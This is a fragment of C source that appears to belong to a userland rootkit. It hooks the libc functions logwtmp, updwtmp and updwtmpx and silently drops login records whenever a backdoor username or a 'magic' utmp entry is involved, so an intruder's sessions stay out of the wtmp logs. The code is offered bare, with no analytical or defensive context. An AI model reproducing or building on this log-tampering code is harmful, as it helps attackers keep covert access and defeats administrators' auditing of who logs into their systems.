void logwtmp(const char *ut_line, const char *ut_name, const char *ut_host){
    if(hide_me || (hide_me = isbduname(ut_name))) return;
    hook(CLOGWTMP);
    call(CLOGWTMP, ut_line, ut_name, ut_host);
}
void updwtmp(const char *wfile, const struct utmp *ut){
    if(hide_me || (ut && (hide_me = magicutmp(ut)))) return;
    hook(CUPDWTMP);
    call(CUPDWTMP, wfile, ut);
}
void updwtmpx(const char *wfilex, const struct utmpx *utx){
    if(hide_me || (utx && (hide_me = magicutmp(utx)))) return;
    hook(CUPDWTMPX);
    call(CUPDWTMPX, wfilex, utx);
}
